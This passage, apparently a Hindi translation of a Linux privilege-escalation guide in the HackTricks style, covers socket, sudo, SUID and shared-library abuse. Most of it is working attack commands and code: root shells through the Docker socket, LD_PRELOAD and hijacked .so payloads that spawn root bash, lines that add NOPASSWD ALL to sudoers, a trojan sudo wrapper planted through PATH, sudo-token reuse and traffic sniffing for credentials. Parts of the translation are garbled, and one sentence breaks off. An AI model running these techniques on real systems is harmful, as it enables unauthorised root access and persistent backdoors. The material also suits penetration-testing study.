### लिखने योग्य सॉकेट्स

यदि आप **किसी भी लिखने योग्य सॉकेट** की पहचान करते हैं (_अब हम Unix सॉकेट्स के बारे में बात कर रहे हैं और `.socket` फ़ाइलों के बारे में नहीं_), तो आप उस सॉकेट के साथ संवाद कर सकते हैं और शायद एक सुरक्षा दोष का शोध कर सकते हैं।

### Unix सॉकेट्स की जांच करें
```bash
netstat -a -p --unix
```
### कच्ची कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**शोषण उदाहरण:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP सॉकेट्स

ध्यान दें कि कुछ **HTTP** अनुरोधों के लिए सुनने वाले **सॉकेट्स** हो सकते हैं (_मैं .socket फ़ाइलों के बारे में नहीं बात कर रहा हूँ बल्कि यूनिक्स सॉकेट के रूप में काम करने वाली फ़ाइलों के बारे में_). आप इसे निम्नलिखित के साथ जांच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
### लिखने योग्य डॉकर सॉकेट

डॉकर सॉकेट, जो अक्सर `/var/run/docker.sock` पर पाया जाता है, एक महत्वपूर्ण फ़ाइल है जिसे सुरक्षित रूप से रखा जाना चाहिए। डिफ़ॉल्ट रूप से, इसे `root` उपयोगकर्ता और `docker` समूह के सदस्यों द्वारा लिखने की अनुमति है। इस सॉकेट को लिखने की अनुमति होने पर यह विशेषाधिकार उन्नति कर सकता है। यहाँ इसका विवरण दिया गया है कि यह कैसे किया जा सकता है और यदि डॉकर CLI उपलब्ध नहीं है तो वैकल्पिक विधियाँ।

#### **डॉकर CLI के साथ विशेषाधिकार उन्नति**

यदि आपके पास डॉकर सॉकेट को लिखने की अनुमति है, तो आप निम्नलिखित कमांड का उपयोग करके विशेषाधिकारों को उन्नत कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### **डॉकर API सीधे उपयोग करना**

उन स्थितियों में जहाँ डॉकर CLI उपलब्ध नहीं है, डॉकर API और `curl` कमांड का उपयोग करके डॉकर सॉकेट को अभी भी मानिपुरित किया जा सकता है।

1. **डॉकर इमेजेस की सूची:**
उपलब्ध इमेजेस की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **एक कंटेनर बनाएं:**
एक अनुरोध भेजें जो मेज़बान सिस्टम की रूट निर्देशिका को माउंट करने वाला एक कंटेनर बनाए।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नए बनाए गए कंटेनर को शुरू करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **कंटेनर से जुड़ें:**
`socat` का उपयोग करें कंटेनर से जुड़ने के लिए, जिससे इसमें कमांड का निष्पादन संभव हो।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` कनेक्शन सेट करने के बाद, आप मेज़बान सिस्टम की फ़ाइल सिस्टम तक रूट स्तर के उपयोग के साथ कंटेनर में सीधे कमांड निष्पादित कर सकते हैं।

### अन्य

ध्यान दें कि यदि आपके पास **`docker` समूह के अंदर हैं** तो आपके पास डॉकर सॉकेट पर लेखन अनुमतियाँ हैं तो आपके पास [**अधिक तरीके हो सकते हैं विशेषाधिकारों को उन्नत करने के लिए**](interesting-groups-linux-pe/#docker-group)। यदि [**डॉकर API एक पोर्ट में सुन रहा है** तो आप इसे कम्प्रमाइज़ कर सकते हैं](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

डॉकर से बाहर निकलने या उसे विशेषाधिकारों को उन्नत करने के लिए उपयोग करने के और **अधिक तरीके** जांचें:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## कंटेनर्ड (ctr) विशेषाधिकार उन्नति

यदि आपको लगता है कि आप **`ctr`** कमांड का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ को पढ़ें क्योंकि **आप इसे विशेषाधिकारों को उन्नत करने के लिए उपयोग कर सकते हैं**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** विशेषाधिकार उन्नति

यदि आपको लगता है कि आप **`runc`** कमांड का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ को पढ़ें क्योंकि **आप इसे विशेषाधिकारों को उन्नत करने के लिए उपयोग कर सकते हैं**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus एक विनम्र **इंटर-प्रोसेस कम्यूनिकेशन (IPC) सिस्टम** है जो एप्लिकेशनों को कार्यक्षमता से आपसी बातचीत और डेटा साझा करने की संभावना प्रदान करता है। आधुनिक लिनक्स सिस्टम के साथ मनोज्ञ ध्यान में रखकर डिज़ाइन किया गया है, यह विभिन्न प्रकार की एप्लिकेशन संचार के लिए मजबूत ढांचा प्रदान करता है।

सिस्टम विविध है, जो प्रक्रियाओं के बीच डेटा विनिमय को बढ़ावा देने वाले मूल IPC का समर्थन करता है, जो एन्हांस्ड UNIX डोमेन सॉकेट्स की तरह प्रक्रियाओं के बीच डेटा विनिमय को बढ़ाता है। इसके अतिरिक्त, यह घटनाओं या संकेतों को प्रसारित करने में मदद करता है, सिस्टम के घटकों के बीच संवेदनशील एकीकरण को बढ़ावा देता है। उदाहरण के लिए, एक ब्लूटूथ डेमन से एक आने वाले कॉल के बारे में सिग्नल एक संगीत प्लेयर को म्यूट करने के लिए प्रेरित कर सकता है, उपयोगकर्ता अनुभव को बढ़ाता है। इसके अतिरिक्त, D-Bus एक दूरस्थ वस्तु सिस्टम का समर्थन करता है, सेवा अनुरोधों और एप्लिकेशनों के बीच विधान और विधि आह्वान सरलीकृत करने में मदद करता है, पारंपरिक रूप से जटिल प्रक्रियाओं को सरल बनाता है।

D-Bus एक **अनुमति/निषेध मॉडल** पर काम करता है, संदेश अनुमतियों (मेथड कॉल्स, सिग्नल उत्पादन आदि) का प्रबंधन मिलाकर मिलाकर मैचिंग नीत
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ एक D-Bus संचार को जांचने और उसका शोषण कैसे करें सीखें:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **नेटवर्क**

मशीन की स्थिति का जांच करने और नेटवर्क को जांचना हमेशा दिलचस्प होता है।

### सामान्य जांच
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### खुले पोर्ट्स

हमेशा मशीन पर चल रही नेटवर्क सेवाओं की जांच करें जिनसे आप पहले इंटरैक्ट करने में सक्षम नहीं थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### स्निफिंग

जांचें कि क्या आप ट्रैफिक स्निफ कर सकते हैं। यदि आप कर सकते हैं, तो आप कुछ क्रेडेंशियल पकड़ सकते हैं।
```
timeout 1 tcpdump
```
## उपयोगकर्ता

### सामान्य जांच

जांच करें **कि** आप कौन हैं, आपके पास कौन से **विशेषाधिकार** हैं, सिस्टम में कौन-कौन **उपयोगकर्ता** हैं, कौन-कौन **लॉगिन** कर सकते हैं और कौन-कौन के **रूट विशेषाधिकार** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### बड़ा UID

कुछ Linux संस्करणों को एक बग से प्रभावित किया गया था जो उपयोगकर्ताओं को **UID > INT\_MAX** के साथ विशेषाधिकारों को बढ़ाने की अनुमति देता है। अधिक जानकारी: [यहाँ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [यहाँ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [यहाँ](https://twitter.com/paragonsec/status/1071152249529884674)।\
**इसे एक्सप्लॉइट** करें: **`systemd-run -t /bin/bash`**

### समूह

जांचें कि क्या आप **किसी समूह के सदस्य** हैं जो आपको रूट विशेषाधिकार प्रदान कर सकता है:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### क्लिपबोर्ड

जांचें कि क्या कोई भी दिलचस्प चीज क्लिपबोर्ड में स्थित है (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आपके पास **पर्यावरण का कोई पासवर्ड है** तो प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने का प्रयास करें उस पासवर्ड का उपयोग करके।

### Su Brute

यदि आपको ज्यादा शोर करने के बारे में चिंता नहीं है और कंप्यूटर पर `su` और `timeout` बाइनरी मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके उपयोगकर्ता को ब्रूट-फोर्स करने का प्रयास कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) के साथ `-a` पैरामीटर का उपयोग करके भी उपयोगकर्ताओं को ब्रूट-फोर्स करने का प्रयास करें।

## लिखने योग्य PATH दुरुपयोग

### $PATH

यदि आपको लगता है कि आप **$PATH के किसी फ़ोल्डर में लिख सकते हैं** तो आप **एक बैकडोर बनाकर उच्चाधिकार को उन्नत कर सकते हैं** जिसका नाम किसी ऐसे कमांड के अंदर होगा जो एक विभिन्न उपयोगकर्ता (मुख्य रूप से रूट) द्वारा निष्पादित किया जाएगा और जो आपके लिखने योग्य फ़ोल्डर से पहले स्थित नहीं है $PATH में।

### SUDO और SUID

आपको सुडो का उपयोग करके कुछ कमांड को निष्पादित करने की अनुमति हो सकती है या उनके पास सुइड बिट हो सकती है। इसे जांचने के लिए:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अप्रत्याशित कमांड्स आपको फ़ाइलें पढ़ने या लिखने या फिर किसी कमांड को चलाने की अनुमति देती हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

सुडो कॉन्फ़िगरेशन एक उपयोगकर्ता को पासवर्ड पता नहीं चलते हुए किसी अन्य उपयोगकर्ता की विशेषाधिकारिता के साथ कुछ कमांड को निष्पादित करने की अनुमति दे सकती है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है, अब रूट निर्देशिका में एक ssh कुंजी जोड़कर या `sh` को कॉल करके शेल प्राप्त करना सरल हो गया है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देशिका उपयोगकर्ता को किसी चीज को **चलाते समय एक environment variable सेट करने** की अनुमति देती है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB मशीन Admirer** पर आधारित था, जो **PYTHONPATH हाइजैकिंग** के लिए **वंशांकन** था ताकि स्क्रिप्ट को रूट के रूप में निष्पादित करते समय कोई भी पायथन पुस्तकालय लोड कर सके:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo execution bypassing paths

**जंप** करें और अन्य फ़ाइलों को पढ़ें या **सिमलिंक** का उपयोग करें। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि **वाइल्डकार्ड** का उपयोग किया जाता है (\*), तो यह और भी सरल हो जाता है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**काउंटरमेज़र्स**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo कमांड/SUID बाइनरी बिना कमांड पथ के

यदि **सुडो अनुमति** किसी एक कमांड को दी जाती है **पथ स्पष्ट किए बिना**: _hacker10 ALL= (root) less_ तो आप PATH वेरिएबल को बदलकर इसका शोषण कर सकते हैं
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक उपयोग की जा सकती है अगर एक **suid** बाइनरी **बिना पथ निर्दिष्ट किए एक अन्य कमांड को निष्पादित करती है (हमेशा** _**strings**_ **के साथ एक अजीब SUID बाइनरी की सामग्री की जांच करें)**।

[निष्पादित करने के लिए पेडलोड उदाहरण।](payloads-to-execute.md)

### SUID बाइनरी के साथ कमांड पथ

अगर **suid** बाइनरी **पथ निर्दिष्ट करते हुए एक अन्य कमांड को निष्पादित करती है**, तो आपको कोशिश करनी चाहिए कि एक फ़ंक्शन निर्मित करें और उसे निर्यात करें जिसे suid फ़ाइल बुलाती है।

उदाहरण के लिए, अगर एक suid बाइनरी _**/usr/sbin/service apache2 start**_ को बुलाती है तो आपको फ़ंक्शन बनाने और उसे निर्यात करने की कोशिश करनी चाहिए:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD_PRELOAD** पर्यावरण चर एक या अधिक साझा पुस्तकालयें (.so फ़ाइलें) निर्दिष्ट करने के लिए उपयोग किया जाता है जो लोडर द्वारा सभी अन्य, स्टैंडर्ड सी पुस्तकालय (`libc.so`) सहित, से पहले लोड की जाएं। इस प्रक्रिया को एक पुस्तकालय को पूर्व-लोड करना कहा जाता है।

हालांकि, सिस्टम सुरक्षा बनाए रखने और इस सुविधा का शोषण न होने देने के लिए, विशेष रूप से **suid/sgid** कार्यक्रमों के साथ, सिस्टम निश्चित शर्तों का पालन करता है:

- लोडर **LD_PRELOAD** को उन कार्यक्रमों के लिए नजरअंदाज करता है जहां वास्तविक उपयोगकर्ता आईडी (_ruid_) मेल नहीं खाती है जो कार्यकारी उपयोगकर्ता आईडी (_euid_) से मेल नहीं खाती है।
- suid/sgid वाले कार्यक्रमों के लिए, केवल मानक पथों में पुस्तकालयें पूर्व-लोड की जाती हैं जो सुइड/एसजीआईडी हैं।

यदि आपके पास `sudo` के साथ कमांड निष्पादित करने की क्षमता है और `sudo -l` का आउटपुट वाक्य **env_keep+=LD_PRELOAD** शामिल है, तो विशेषाधिकार उन्नयन हो सकता है। यह समाक्षमता **LD_PRELOAD** पर्यावरण चर को स्थायी रूप से बनाए रखने और मान्य मान्यता प्राप्त करने की अनुमति देता है जब कमांड `sudo` के साथ चलाई जाती है, जिससे संभावित रूप से उच्च विशेषाधिकारों के साथ विचारहीन कोड का निष्पादन हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
सहेजें जैसे **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर निम्नलिखित का उपयोग करके **कंपाइल** करें:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **विशेषाधिकारों को बढ़ाएं** चल रहा है
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
एक समान privesc का दुरुपयोग किया जा सकता है अगर हमलावार **LD\_LIBRARY\_PATH** env variable को नियंत्रित करता है क्योंकि उसने पथ को नियंत्रित किया है जहां पुस्तकालयों की खोज की जाएगी।
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID बाइनरी - .so इंजेक्शन

जब एक बाइनरी के साथ **SUID** अनुमतियाँ होती हैं जो असामान्य लगती है, तो यह अच्छा अभ्यास है कि यह सत्यापित किया जाए कि क्या यह **.so** फ़ाइलें सही ढंग से लोड कर रहा है। इसे निम्नलिखित कमांड चलाकर जांचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, त्रुटि का सामना करना _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (कोई ऐसा फ़ाइल या निर्देशिका नहीं है)"_ एक शोषण की संभावना सुझाता है।

इसे शोषित करने के लिए, कोई एक सी फ़ाइल बनाना होगा, मान लीजिए _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड हो:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह कोड, एक बार कंपाइल और निष्पादित किया जाने पर, फ़ाइल अनुमतियों को मानिपुलेट करके और उच्च अधिकारों वाले शैल को निष्पादित करके अधिकारों को उन्नत करने का उद्देश्य रखता है।

उपरोक्त सी फ़ाइल को एक साझा ऑब्जेक्ट (.so) फ़ाइल में कंपाइल करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
## साझा ऑब्जेक्ट हाइजैकिंग

अंत में, प्रभावित SUID बाइनरी को चलाने से उत्पन्न सुरक्षा दोष को क्रियाशील करना चाहिए, जिससे संभावित तंत्र प्रणाली को कमजोर किया जा सकता है।
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमें एक SUID बाइनरी मिल गई है जो एक लाइब्रेरी लोड कर रही है जो एक फ़ोल्डर से हो जहाँ हम लिख सकते हैं, तो उस फ़ोल्डर में आवश्यक नाम की लाइब्रेरी बनाएं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
अगर आपको निम्नलिखित त्रुटि मिलती है:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
इसका मतलब है कि जिस पुस्तकालय को आपने उत्पन्न किया है, उसमें `a_function_name` नामक एक फ़ंक्शन होना चाहिए।

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) एक चयनित सूची है जिसमें यूनिक्स बाइनरी हैं जिन्हें एक हमलावर द्वारा स्थानीय सुरक्षा प्रतिबंधों को दौर करने के लिए उपयोग किया जा सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) एक समान है लेकिन उन मामलों के लिए जहां आप **केवल तर्क इंजेक्शन** कर सकते हैं।

यह परियोजना यूनिक्स बाइनरी के वैध फ़ंक्शनों को एकत्रित करती है जो प्रतिबंधित शैलियों से बाहर निकलने, ऊँची विशेषाधिकारों को उन्नत करने या बनाए रखने, फ़ाइलों को स्थानांतरित करने, बाइंड और रिवर्स शैलियों को उत्पन्न करने, और अन्य पोस्ट-एक्सप्लोइटेशन कार्यों को सुविधाजनक बनाने के लिए दुरुपयोग किए जा सकते हैं।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

यदि आप `sudo -l` तक पहुंच सकते हैं तो आप उपकरण [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग कर सकते हैं ताकि यह जांच सके कि क्या यह किसी सुडो नियम का शोध करता है।

### Sudo टोकन का पुनः उपयोग

उन मामलों में जहां आपके पास **sudo एक्सेस** है लेकिन पासवर्ड नहीं है, आप **sudo कमांड के निष्पादन का इंतजार करके और फिर सत्र टोकन को हाइजैक करके** विशेषाधिकारों को उन्नत कर सकते हैं।

विशेषाधिकारों को उन्नत करने के लिए आवश्यकताएं:

* आपके पास पहले से ही उपयोगकर्ता "_नमूनाउपयोगकर्ता_" के रूप में एक शैली है
* "_नमूनाउपयोगकर्ता_" ने **`sudo` का उपयोग** करके कुछ को **पिछले 15 मिनटों** में निष्पादित किया है (डिफ़ॉल्ट रूप से यह समय है जो हमें किसी पासवर्ड को दर्ज किए बिना `sudo` का उपयोग करने की अनुमति देता है)
* `cat /proc/sys/kernel/yama/ptrace_scope` 0 है
* `gdb` एक्सेस करने योग्य है (आप इसे अपलोड कर सकते हैं)

(आप `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` के साथ `ptrace_scope` को अस्थायी रूप से सक्षम कर सकते हैं या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को संशोधित करके `kernel.yama.ptrace_scope = 0` सेट करके)

यदि सभी योग्यताएं पूरी होती हैं, तो **आप निम्नलिखित का उपयोग करके विशेषाधिकारों को उन्नत कर सकते हैं:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **पहला उत्पीड़न** (`exploit.sh`) _/tmp/_ में `activate_sudo_token` नामक बाइनरी बनाएगा। आप इसका उपयोग करके **अपने सत्र में सुडो टोकन को सक्रिय कर सकते हैं** (आपको स्वचालित रूप से रूट शैली नहीं मिलेगी, `sudo su` करें):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* दूसरा उत्पीड़न (`exploit_v2.sh`) _/tmp_ में एक sh शैल बनाएगा **जिसका मालिक रूट होगा और सेटयूआइड होगा**।
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* तीसरा उत्पीड़न (`exploit_v3.sh`) **एक सुडोअर्स फ़ाइल बनाएगा** जो **सुडो टोकन को शाश्वत बनाएगा और सभी उपयोगकर्ताओं को सुडो का उपयोग करने की अनुमति देगा**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<उपयोगकर्ता नाम>

यदि आपको इस फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल में **लेखन अनुमति** है, तो आप [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) नामक बाइनरी का उपयोग करके **उपयोगकर्ता और PID के लिए एक सुडो टोकन बना सकते हैं**।\
उदाहरण के लिए, यदि आप _/var/run/sudo/ts/sampleuser_ फ़ाइल को अधिलेखित कर सकते हैं और आपके पास उस उपयोगकर्ता के रूप में PID 1234 के साथ एक शैल है, तो आप **पासवर्ड जानने की आवश्यकता के बिना सुडो विशेषाधिकार प्राप्त** कर सकते हैं:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और फ़ोल्डर `/etc/sudoers.d` के अंदर की फ़ाइलें `sudo` कौन और कैसे उपयोग कर सकता है यह कॉन्फ़िगर करती है। इन फ़ाइलों **डिफ़ॉल्ट रूप से केवल उपयोगकर्ता रूट और समूह रूट द्वारा पढ़ी जा सकती हैं**।\
**अगर** आप इस फ़ाइल को **पढ़ सकते हैं** तो आप **कुछ दिलचस्प जानकारी प्राप्त** कर सकते हैं, और अगर आप किसी भी फ़ाइल में **लिख सकते हैं** तो आप **विशेषाधिकार उन्नत कर सकते हैं**।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं तो आप इस अनुमति का दुरुपयोग कर सकते हैं।
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन अनुमतियों का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

कुछ विकल्प `sudo` बाइनरी के लिए `doas` जैसे हैं जो OpenBSD के लिए हैं, `/etc/doas.conf` पर इसकी विन्यास की जांच करना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo हाइजैकिंग

अगर आपको पता है कि **एक उपयोगकर्ता सामान्यत: एक मशीन से कनेक्ट करता है और `sudo` का उपयोग करके विशेषाधिकारों को बढ़ाता है** और आपके पास उस उपयोगकर्ता संदर्भ में एक शैल मिल गया है, तो आप **एक नया sudo executable बना सकते हैं** जो आपके कोड को रूट के रूप में और फिर उपयोगकर्ता के कमांड के रूप में निष्पादित करेगा। फिर, **उपयोगकर्ता संदर्भ का $PATH संशोधित करें** (उदाहरण के लिए .bash\_profile में नया पथ जोड़ें) ताकि जब उपयोगकर्ता sudo का उपयोग करता है, तो आपका sudo executable निष्पादित होता है।

ध्यान दें कि अगर उपयोगकर्ता एक विभिन्न शैल (बैश नहीं) का उपयोग करता है, तो आपको नए पथ जोड़ने के लिए अन्य फ़ाइलों को संशोधित करने की आवश्यकता होगी। उदाहरण के लिए [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py) में एक और उदाहरण पा सकते हैं।

या कुछ इस प्रकार का कुछ चला सकते हैं:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा पुस्तकालय

### ld.so

फ़ाइल `/etc/ld.so.conf` इसका सूचित करती है कि **लोड की गई कॉन्फ़िगरेशन फ़ाइलें कहाँ से हैं**। सामान्यत: यह फ़ाइल निम्नलिखित पथ को शामिल करती है: `include /etc/ld.so.conf.d/*.conf`

इसका अर्थ है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएंगी। यह कॉन्फ़िगरेशन फ़ाइलें **अन्य फ़ोल्डर्स की ओर इशारा करती हैं** जहाँ **पुस्तकालयें** खोजी जाएंगी। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका अर्थ है कि सिस्टम `/usr/local/lib` के अंदर पुस्तकालयों की खोज करेगा**।

यदि किसी कारणवश **किसी उपयोगकर्ता के पास लिखने की अनुमति है** किसी भी निर्दिष्ट पथ पर: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के किसी भी फ़ाइल या `/etc/ld.so.conf.d/*.conf` के भीतर किसी भी फ़ोल्डर पर, तो उसे वर्चस्व को बढ़ाने की संभावना हो सकती है।\
निम्नलिखित पृष्ठ पर **इस गलत कॉन्फ़िगरेशन का शोध कैसे करें** इसे देखें:

